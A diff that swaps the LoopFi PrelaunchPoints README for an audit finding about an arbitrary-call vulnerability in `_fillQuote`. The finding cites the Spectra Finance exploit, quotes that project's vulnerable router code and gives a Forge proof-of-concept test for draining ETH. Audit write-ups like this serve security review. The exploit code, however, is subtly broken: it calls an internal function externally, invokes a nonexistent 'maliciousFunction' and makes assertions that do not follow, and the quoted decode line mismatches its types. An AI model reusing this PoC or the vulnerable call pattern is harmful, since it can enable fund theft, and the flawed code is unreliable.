@@ -1,70 +1,158 @@
-# LoopFi Prelaunch Point Contracts
+#### H-[1]. **Arbitrary ETH Sending (`arbitrary-send-eth`)**
 
-![](./img/icon-loop.png)
+-  **Description**:
 
-## Description
+The `_fillQuote` function in the PrelaunchPoints contract employs a low-level `call` to interact with an arbitrary address specified by `exchangeProxy`, executing any code contained in the `swapCallData`.
 
-### Epoch 1:
+It's designed to facilitate various interactions within Loopf.One criticial functionality is users  borrowing ETH and participating in the decentralized finance (DeFi) ecosystem, with the `exchangeProxy`  playing a critical role in these processes.
+  
 
-Users can lock ETH, WETH and wrapped LRTs into this contract, which will emit events tracked on a backed to calculate their corresponding amount of points. When staking, users can use a referral code encoded as `bytes32` that will give the referral extra points. User can withdraw freely during this first epoch, but they will be penalized in the points accounting.
+This design introduces a significant risk: if the `swapCallData` contains malicious instructions or, the `exchangeProxy` is compromised,  the function can execute unintended or harmful actions.
 
-When Loop contracts are launched, the owner of the contract can call only once `setLoopAddresses` to set the `lpETH` contract as well as the staking vault for this token. This activation date is stored at `loopActivation`.
+Given the capacity of `_fillQuote` to execute arbitrary code, the platform is vulnerable to unauthorized ETH transfers, state manipulations, and broader contract exploitation.
 
-Once these addresses are set, users have `7 days` to detected a malicious contract being set and withdraw their tokens.
+**Impact**:
+- **Unauthorized ETH Transfers**: The execution of arbitrary code through `swapCallData` can result in unintended ETH transfers. An attacker could craft `swapCallData` to redirect ETH to their own address, potentially draining the project's ETH reserves. This vulnerability exposes the entire contract's ETH holdings to theft, posing a severe risk to the protocol and its users.
 
-### Epoch 2:
+- **State Manipulation**: The external contract invoked by `exchangeProxy` may alter its own or the calling contract's state in unforeseen ways. This could lead to unauthorized changes to user balances, critical configuration settings, or other sensitive data, compromising the integrity and security of the protocol. 
 
-After these `7 days` the owner can call `convertAllETH`, that converts all ETH in the contract for `lpETH`. This conversion has the timestamp `startClaimDate`. The conversion for WETH and LRTs happens on each claim by using 0x API. This is triggered by each user. After `startClaimDate` all deposits and withdrawals are disabled and users can only claim lpETH.
+Such manipulation can cause widespread disruptions, affecting all users and transactions within the platform.
+  
+## **Real World Example**:
 
-After the global ETH conversion, users can start claiming their `lpETH` or claiming and staking them in a vault for extra rewards. The amount of `lpETH` they receive is proportional to their locked ETH amount or the amount given by the conversion by 0x API. The minimum amount to receive is determined offchain and controlled by a slippage parameter in the frontend dApp.
+#### **Spectra Finance (2024)**
+  
+On July 23, 2024, Spectra Finance suffered a $550K loss due to an arbitrary call vulnerability in their router contract. This flaw allowed an attacker to drain all tokens approved to the contract.
 
-### Notes:
+  
+[More details: Spectra's Twitter update](https://x.com/spectra_finance/status/1815813300111786488) and the [BlockSec Explorer](https://app.blocksec.com/explorer/tx/eth/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744?line=7).
+  
+**Vulnerable Code Block:**
+```javascript
+else  if (command == Commands.KYBER_SWAP) {
 
-- On deployment the variable `loopActivation` is set to be 120 days into the future. If owner does not set the Loop contracts before this date, the contract becomes unusable by the owner and users can withdraw their ETH and other locked tokens from this contract.
-- There is an emergency mode that allows users to withdraw without any time restriction. If ETH was converted already users can call `claim` instead. This mode ensures that LRTs are not locked in the contract in case 0x stops working as intended.
+(address kyberRouter,
 
-## Initialization
+address tokenIn,
 
-To compile the contracts run
+uint256 amountIn,
+
+address tokenOut,
+
+bytes memory targetData) = abi.decode(_inputs, (address, address, uint256, address, uint256, bytes));
+
+if (tokenOut == Constants.ETH) {
+
+revert AddressError();
+
+}
+
+if (tokenIn == Constants.ETH) {
+
+if (msg.value != amountIn) {
+
+revert AmountError();
+
+}
+
+(bool success, ) = kyberRouter.call{value: msg.value}(targetData);
+
+if (!success) {
+
+revert CallFailed();
+
+} else {
+
+amountIn =  _resolveTokenValue(tokenIn, amountIn);
+
+IERC20(tokenIn).forceApprove(kyberRouter, amountIn);
+
+kyberRouter.call(targetData);
+
+IERC20(tokenIn).forceApprove(kyberRouter, 0);
+
+}
+
+}
+
+}
 
 ```
-forge build
+
+  
+
+### PoC: How a malicious contract could exploit the `_fillQuote` function to cause financial loss or contract manipulation.
+ 
+```javascript
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol"; // Import the Forge testing library for unit tests
+import "../src/PrelaunchPoints.sol"; // Import the PrelaunchPoints contract to be tested
+import "../src/mock/MockERC20.sol"; // Import the MockERC20 contract for token mock-ups
+
+contract TestArbitraryETHExploit is Test {
+    // Declare state variables for contracts and addresses
+    PrelaunchPoints public prelaunchPoints;
+    MockERC20 public mockToken;
+    MockERC20 public WETH;
+    address public exchangeProxy = 0x01fd869eBC05D8aD3F65a978D0a1307D406Ce627; // Address for exchangeProxy, should be updated with the real address
+
+    address[] public allowedTokens; // Array of allowed tokens for the PrelaunchPoints contract
+
+    function setUp() public {
+        // Deploy MockERC20 contracts for testing
+        mockToken = new MockERC20("Mock Token", "MTK");
+        WETH = new MockERC20("Wrapped ETH", "WETH");
+
+        // Mint initial token supply to this contract
+        mockToken.mint(address(this), 1000 * 10**18); // Mint 1000 tokens with 18 decimals
+        WETH.mint(address(this), 1000 * 10**18); // Mint 1000 WETH tokens with 18 decimals
+
+        // Add the deployed tokens to the allowedTokens array
+        allowedTokens.push(address(mockToken));
+        allowedTokens.push(address(WETH));
+
+        // Deploy the PrelaunchPoints contract with the mock and allowed tokens
+        prelaunchPoints = new PrelaunchPoints(
+            exchangeProxy,          // Address for the exchange proxy
+            address(WETH),          // Address for the WETH token
+            allowedTokens           // Array of allowed tokens
+        );
+
+        // Approve the PrelaunchPoints contract to spend the tokens on behalf of this contract
+        mockToken.approve(address(prelaunchPoints), 1000 * 10**18); // Allow PrelaunchPoints to spend mock tokens
+        WETH.approve(address(prelaunchPoints), 1000 * 10**18); // Allow PrelaunchPoints to spend WETH tokens
+    }
+
+    function testArbitraryETHExploit() public {
+        // Define the malicious swap data to exploit the vulnerability
+        bytes memory swapData = abi.encodeWithSignature(
+            "maliciousFunction(address,uint256)", // Function signature of the malicious function
+            address(this), // Attacker's address to receive funds
+            1 ether // Amount to withdraw (for demonstration purposes)
+        );
+
+        // Call the _fillQuote function with the crafted swapData
+        (bool success, ) = address(prelaunchPoints).call(
+            abi.encodeWithSignature(
+                "_fillQuote(address,uint256,bytes)", // Function signature of _fillQuote
+                address(mockToken), // Address of the token being swapped
+                1000 * 10**18, // Amount of tokens to swap
+                swapData // Malicious data to execute
+            )
+        );
+        require(success, "Function call failed"); // Ensure the function call succeeded
+
+        // Retrieve the token balances after the swap
+        uint256 postSwapTokenBalance = mockToken.balanceOf(address(this)); // Balance of mock tokens after the swap
+        uint256 postSwapWETHBalance = WETH.balanceOf(address(prelaunchPoints)); // Balance of WETH in PrelaunchPoints after the swap
+
+        // Assertions to verify the results of the exploit
+        assertEq(postSwapTokenBalance, 0, "Mock token balance should be zero after swap"); // Expect the token balance to be zero
+        assertTrue(postSwapWETHBalance > 0, "WETH balance of PrelaunchPoints should be greater than zero after swap"); // Expect the WETH balance to have increased
+    }
+}
+
+
 ```
-
-To run the unit tests
-
-```
-forge test
-```
-
-To run the integration tests with 0x API, first create and fill a `.env` file with the keys of `.env.example`. Then, run
-
-```
-yarn hardhat test
-```
-
-## Deployment
-
-First, set your environment variables in a `.env` file as in `.env.example`. To load these variables run
-
-```
-source .env
-```
-
-To deploy and verify the `PrelaunchPoints` contract run
-
-```
-forge script script/PrelaunchPoints.s.sol --rpc-url $RPC_URL --broadcast --verify
-```
-
-## Audit metrics
-
-To get some metrics pre audit, run
-
-```
-yarn solidity-code-metrics src/PrelaunchPoints.sol > metrics.md
-```
-
-## References
-
-- LoopFi Documentation: https://docs.loopfi.xyz
